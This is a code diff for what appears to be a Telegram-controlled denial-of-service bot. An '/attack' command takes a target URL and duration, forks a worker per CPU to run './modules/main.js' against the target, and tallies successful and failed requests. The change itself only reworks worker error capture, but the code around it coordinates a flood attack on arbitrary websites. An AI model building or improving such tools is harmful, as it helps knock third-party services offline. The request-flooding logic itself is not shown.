@@ -153,7 +153,15 @@ bot.onText(/\/attack(?: (.+) (\d+))?/, async (msg, match) => {
     const numCPUs = os.cpus().length; // Gunakan semua CPU yang tersedia (2 di Railway)
 
     for (let i = 0; i < numCPUs; i++) {
-        const worker = fork('./modules/main.js');
+        const worker = fork('./modules/main.js', [], {
+            stdio: ['pipe', 'pipe', 'pipe', 'ipc'] // Capture stdout, stderr
+        });
+        worker.stderr.on('data', (data) => {
+            const errorString = data.toString();
+            console.error(`[Worker PID ${worker.pid} STDERR]: ${errorString}`);
+            // Append to the last error, as stderr can come in chunks
+            lastWorkerError = (lastWorkerError || '') + errorString;
+        });
         worker.send({ targetUrl, duration });
         worker.on('message', (message) => {
             if (message.type === 'stats') {
@@ -161,9 +169,6 @@ bot.onText(/\/attack(?: (.+) (\d+))?/, async (msg, match) => {
                 combinedStats.success += message.data.success;
                 combinedStats.failed += message.data.failed;
                 combinedStats.phases[worker.pid] = message.data.phase;
-            } else if (message.type === 'error') {
-                // Store the last error message from any worker
-                lastWorkerError = message.data;
             }
         });
         worker.on('exit', (code) => handleWorkerExit(worker.pid, code));
